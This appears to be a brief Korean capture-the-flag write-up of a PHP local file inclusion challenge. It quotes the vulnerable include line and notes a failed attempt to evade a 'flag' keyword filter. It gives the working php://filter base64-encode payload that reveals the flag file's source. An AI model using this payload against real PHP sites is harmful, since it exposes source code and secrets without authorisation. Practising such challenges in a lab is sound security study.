# php-1

`<?php include $_GET['page']?$_GET['page'].'.php':'main.php'; ?>`
이런 코드가 있다. 
- 그리고 URL에서
`/?page=list`, `/?page=main` 이렇게 받으면, list.php, main.php파일을 보여준다. 
    - 이걸 이용해서 `/?page=/var/www/uploads/flag`를 하면 파일 내용을 볼 수 있음. 
    - 내용은 `"can you see $flag?"` 이것이 전부.. 
        - 아마도 flag가 주석처리되서 렌더링이 안되는 듯..
    - view, list를 활용해야하는 문제같은데 flag를 필터링 하니.. 이걸 어애 하지. 

- ?/page=view, view.php파일로 파일의 내용을 볼 수 있다. 하지만, 'flag'라는 단어를 필터링한다. 
    - 그래서 알파벳 하나를 2번 인코딩해서 우회하려 했으나, 안됨.
    - 일단, flag를 필터링한다는 거부터가 이걸 쓰는게 아니라는 거임.

- `/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag`
    - 이러면 flag파일이 base64로 인코딩되서 렌더링이 됨.
    - 렌더링 된 base64 코드를 디코딩함. 
    - `<?php $flag = 'DH{<여기에 플래그>}'; ?> can you see $flag?`
    - `/page=/var/www/uploads/flag`에서는 안보인 flag내용을 확인가능!

>php://filter로 확인가능하다니 신기하다.